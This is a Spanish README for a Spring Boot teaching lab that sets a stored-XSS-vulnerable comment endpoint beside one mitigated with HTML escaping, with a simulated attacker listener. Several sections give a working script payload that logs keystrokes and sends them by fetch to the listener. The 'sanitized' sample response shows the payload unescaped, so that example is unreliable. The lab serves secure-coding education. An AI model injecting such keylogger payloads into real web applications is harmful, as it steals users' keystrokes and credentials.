# 🛡️ Spring Boot XSS Keylogger Demo Lab (Vulnerable vs Mitigado)

Este proyecto es una aplicación web demostrativa desarrollada con **Spring Boot 3**, **Spring Data JPA**, **MySQL** y un frontend interactivo estático en HTML5/CSS3/JavaScript.

Su objetivo es enseñar conceptual y prácticamente la vulnerabilidad **Cross-Site Scripting (XSS Stored)**, mostrando cómo un script malicioso de captura de teclado (**Keylogger**) puede ser inyectado y ejecutado en la aplicación cliente cuando no existe sanitización, y cómo se puede prevenir mediante la técnica de **HTML Escaping / Saneamiento en Backend**.

---

## 🏗️ Arquitectura del Proyecto

El proyecto sigue una arquitectura limpia multicapa en Spring Boot:

- **Modelo (`Comment.java`)**: Entidad JPA mapeada a MySQL/H2 con id, autor, contenido, bandera de mitigación y fecha de creación.
- **Repositorio (`CommentRepository.java`)**: Interfaz JPA para operaciones CRUD en base de datos.
- **Servicio (`CommentService.java`)**: Lógica de negocio con métodos separados para almacenamiento crudo (vulnerable) y saneado mediante `HtmlUtils.htmlEscape()` (mitigado).
- **Controladores REST**:
  - `VulnerableCommentController`: Endpoint `/api/vulnerable/comments` (XSS activado).
  - `MitigatedCommentController`: Endpoint `/api/mitigated/comments` (XSS prevenido).
  - `KeyloggerListenerController`: Endpoint `/api/keylogger/log` y `/api/keylogger/logs` que simula el servidor de comando y control (C2) del atacante que recibe las teclas exfiltradas.
- **Frontend Estático (`index.html`, `styles.css`, `app.js`)**: Interfaz web interactiva con tema oscuro y panel en tiempo real de captura de teclas.

---

## 📋 Requisitos Previos

- **Java JDK 17** o superior (Probado en Java 25).
- **Apache Maven 3.9+**.
- **MySQL Server** corriendo localmente en el puerto 3306 (Opcional: se puede usar base de datos en memoria H2).

---

## ⚙️ Configuración de Base de Datos (MySQL vs H2)

### Opción A: Servidor MySQL (Configuración por Defecto)

1. Asegúrate de que MySQL esté en ejecución en `localhost:3306`.
2. En `src/main/resources/application.properties`, las credenciales por defecto son:
   - **URL**: `jdbc:mysql://localhost:3306/xss_demo_db?createDatabaseIfNotExist=true`
   - **Usuario**: `root`
   - **Contraseña**: `root`
     *(La base de datos `xss_demo_db` y la tabla `comments` se crearán automáticamente al arrancar la aplicación).*

### Opción B: Base de datos H2 en memoria (Sin instalar MySQL)

Si prefieres probar la app sin arrancar MySQL, desapunta MySQL y activa H2 descomentando estas líneas en `src/main/resources/application.properties`:

```properties
spring.datasource.url=jdbc:h2:mem:xssdb;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE
spring.datasource.driverClassName=org.h2.Driver
spring.datasource.username=sa
spring.datasource.password=
```

---

## 🚀 Ejecución de la Aplicación

Para compilar y arrancar la aplicación con Maven:

```bash
mvn spring-boot:run
```

Una vez iniciada la app, abre en tu navegador web:
👉 **[http://localhost:8080](http://localhost:8080)**

---

## 🧪 Pruebas en Postman o Bruno

A continuación se detallan las rutas e instrucciones de prueba para importar en herramientas como **Postman** o **Bruno**.

### 1. Endpoint Vulnerable (Almacena y sirve XSS en crudo)

#### 🔹 `POST /api/vulnerable/comments`

- **Método**: `POST`
- **URL**: `http://localhost:8080/api/vulnerable/comments`
- **Headers**: `Content-Type: application/json`
- **Body (JSON)** con Payload de Keylogger:

```json
{
  "author": "Atacante XSS",
  "content": "<script>document.addEventListener('keydown', function(e){ fetch('/api/keylogger/log?key=' + encodeURIComponent(e.key)); });</script><p style='color:red;'>¡Keylogger Activo!</p>"
}
```

#### 🔹 `GET /api/vulnerable/comments`

- **Método**: `GET`
- **URL**: `http://localhost:8080/api/vulnerable/comments`
- **Respuesta**: Devuelve la lista de comentarios conteniendo la etiqueta `<script>` sin sanitizar.

---

### 2. Endpoint Mitigado (HTML Escaping aplicado)

#### 🔹 `POST /api/mitigated/comments`

- **Método**: `POST`
- **URL**: `http://localhost:8080/api/mitigated/comments`
- **Headers**: `Content-Type: application/json`
- **Body (JSON)** con el mismo Payload:

```json
{
  "author": "Atacante Neutralizado",
  "content": "<script>document.addEventListener('keydown', function(e){ fetch('/api/keylogger/log?key=' + encodeURIComponent(e.key)); });</script><p style='color:red;'>¡Intento de Keylogger!</p>"
}
```

#### 🔹 `GET /api/mitigated/comments`

- **Método**: `GET`
- **URL**: `http://localhost:8080/api/mitigated/comments`
- **Respuesta**: Devuelve los valores sanitizados convirtiendo los caracteres especiales:

```json
[
  {
    "id": 1,
    "author": "Atacante Neutralizado",
    "content": "<script>document.addEventListener('keydown', function(e){ fetch('/api/keylogger/log?key=' + encodeURIComponent(e.key)); });</script><p style='color:red;'>¡Intento de Keylogger!</p>",
    "isMitigated": true
  }
]
```

---

### 3. Endpoints del Keylogger Listener (Consola de Atacante)

#### 🔹 `POST / GET /api/keylogger/log`

- **Método**: `GET` o `POST`
- **URL**: `http://localhost:8080/api/keylogger/log?key=a`
- **Descripción**: Endpoint receptor donde el script malicioso inyectado envía las teclas capturadas.

#### 🔹 `GET /api/keylogger/logs`

- **Método**: `GET`
- **URL**: `http://localhost:8080/api/keylogger/logs`
- **Respuesta**: Retorna la lista en tiempo real de todas las teclas capturadas por el laboratorio.

#### 🔹 `DELETE /api/keylogger/logs`

- **Método**: `DELETE`
- **URL**: `http://localhost:8080/api/keylogger/logs`
- **Descripción**: Limpia los registros de la consola del atacante y borra los comentarios en base de datos.

---

## 🧠 ¿Cómo Funciona la Mitigación?

La prevención de XSS Stored en este ejemplo se logra a través del método `HtmlUtils.htmlEscape(input)` de Spring Framework (`org.springframework.web.util.HtmlUtils`).

- `<` se transforma en `&lt;`
- `>` se transforma en `&gt;`
- `"` se transforma en `&quot;`
- `'` se transforma en `&#39;`
- `&` se transforma en `&amp;`

Cuando el navegador recibe `&lt;script&gt;...&lt;/script&gt;`, lo despliega en pantalla como simple texto legible y **nunca lo interpreta ni ejecuta como un bloque de código JavaScript**, impidiendo por completo la activación del Keylogger.

---

## 📚 Anexo: Preguntas Frecuentes y Conceptos Clave del Código (FAQ)

### 1. Entidad Modelo (`Comment.java`)

* **`@Column(columnDefinition = "TEXT", nullable = false)`**:
  * **`columnDefinition = "TEXT"`**: En MySQL, un `String` estándar en JPA se mapea a `VARCHAR(255)`. Dado que los scripts de inyección XSS o Keyloggers superan fácilmente los 255 caracteres, definir la columna como `TEXT` permite almacenar hasta 64 KB de payload en crudo o escapado sin errores de truncamiento.
  * **`nullable = false`**: Restricción `NOT NULL` a nivel de base de datos.
* **`@Column(name = "created_at", nullable = false, updatable = false)`**:
  * **`updatable = false`**: Garantiza la inmutabilidad de la fecha de creación. Se incluye en la sentencia `INSERT` pero se excluye de cualquier `UPDATE` posterior.
* **`@PrePersist`**:
  * Funciona como un **asistente automático** que se ejecuta justo antes de guardar una nueva entidad en la base de datos. Si la fecha es nula, le asigna automáticamente la fecha/hora actual (`LocalDateTime.now()`) e inicializa `isMitigated` en `false`.

---

### 2. Repositorio (`CommentRepository.java`)

* **Query Methods de Spring Data JPA**:
  * **`findByIsMitigatedOrderByIdDesc(Boolean isMitigated)`**: Filtra comentarios por su estado de mitigación (`false` para vulnerables, `true` para mitigados) ordenados descendentemente por ID (los más recientes primero).
  * **`findAllByOrderByIdDesc()`**: Recupera la totalidad de comentarios guardados ordenados del más reciente al más antiguo.

---

### 3. Controlador Vulnerable (`VulnerableCommentController.java`)

* **Pruebas de Inyección XSS desde Bruno / Postman / cURL**:
  * **Método**: `POST` | **URL**: `http://localhost:8080/api/vulnerable/comments` | **Header**: `Content-Type: application/json`
  * **Payload de prueba PoC**:
    ```json
    {
      "author": "Atacante XSS",
      "content": "<script>alert('XSS Detectado');</script>"
    }
    ```
  * **Payload de Keylogger**:
    ```json
    {
      "author": "Atacante Keylogger",
      "content": "<script>document.addEventListener('keydown', function(e){ fetch('/api/keylogger/log?key=' + encodeURIComponent(e.key)); });</script>"
    }
    ```

---

### 4. Receptor Keylogger (`KeyloggerListenerController.java`)

* **`Collections.synchronizedList(new ArrayList<>())`**:
  * Almacena las teclas exfiltradas en memoria RAM. Usa `synchronizedList` para brindar seguridad multihilo (*thread-safety*), ya que Spring Boot atiende múltiples peticiones HTTP simultáneas.
* **`public static class KeyLogEntry`**:
  * Clase anidada estática (*Static Nested Class*) que actúa como DTO interno para estructurar los datos de cada tecla capturada (`key`, `sourceIp`, `timestamp`).
* **Endpoint Receptor `/api/keylogger/log` (`receiveKeyLog`)**:
  * Actúa como el "buzón receptor del atacante". Recibe pulsaciones por `GET` (`?key=a`) o `POST`, las encola en la memoria compartida y responde `HTTP 200 OK` de forma transparente.

